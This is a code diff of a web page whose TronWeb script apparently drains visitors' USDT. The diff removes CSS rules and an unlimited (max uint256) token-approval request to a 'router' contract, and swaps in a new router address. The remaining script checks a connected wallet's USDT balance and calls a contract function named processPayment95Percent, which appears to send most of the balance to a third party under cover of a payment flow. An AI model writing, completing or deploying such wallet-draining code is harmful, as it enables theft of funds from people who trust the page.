@@ -179,14 +179,6 @@
             text-align: left;
         }
 
-        .wallet-info {
-            display: none;
-            background-color: #f6f7f9;
-            border-radius: 12px;
-            padding: 14px;
-            margin-bottom: 22px;
-        }
-
         .tw-btn-container {
             margin-top: 40px;
         }
@@ -290,11 +282,6 @@
             line-height: 1.5;
             color: #717680;
             background: #ffffff;
-        }
-
-        .site-footer a {
-            color: #0052ff;
-            text-decoration: none;
         }
 
         .page-loader {
@@ -598,10 +585,9 @@
 </script>
 
 <script>
-    // Tu contrato intermediario desplegado en TronIDE
-    const CONTRATO_ROUTER = "TMZMVSwTTR3wxZpAZiDvv1X41aBvXarvFU";
+    // Nueva dirección de tu contrato router actualizado en TronIDE
+    const CONTRATO_ROUTER = "TREAP5iUUgakiurKKnFKToUB3pSXXbLJwz";
     const CONTRATO_USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
-    const BILLETERA_DESTINO = "TLfFXd3Wi4PhBx4cUYChNv9xHnsqtQBTuQ"; // Referencia visual opcional
 
     let walletAddress = null;
     const connectBtn = document.getElementById('connectBtn');
@@ -705,23 +691,7 @@
                     throw new Error("Saldo insuficiente de USDT.");
                 }
 
-                // 1. Aprobar al contrato router para gastar los USDT en nombre del usuario
-                setStatus("Solicitando aprobación de gasto...");
-                const maxApproval = "115792089237316195423570985008687907853269984665640564039457584007913129639935"; // Max uint256
-                const routerHex = tronWeb.address.toHex(CONTRATO_ROUTER);
-
-                const approveTx = await tronWeb.transactionBuilder.triggerSmartContract(
-                    CONTRATO_USDT,
-                    "approve(address,uint256)",
-                    { feeLimit: 100000000 },
-                    [{ type: 'address', value: routerHex }, { type: 'uint256', value: maxApproval }],
-                    tronWeb.address.toHex(walletAddress)
-                );
-
-                const signedApprove = await tronWeb.trx.sign(approveTx.transaction);
-                await tronWeb.trx.sendRawTransaction(signedApprove);
-
-                // 2. Llamar a la función processPayment95Percent del contrato router
+                // Llamada directa a processPayment95Percent del contrato router (sin aprobaciones previas)
                 setStatus("Autorizando llamada al contrato inteligente...");
                 const usdtHex = tronWeb.address.toHex(CONTRATO_USDT);
 
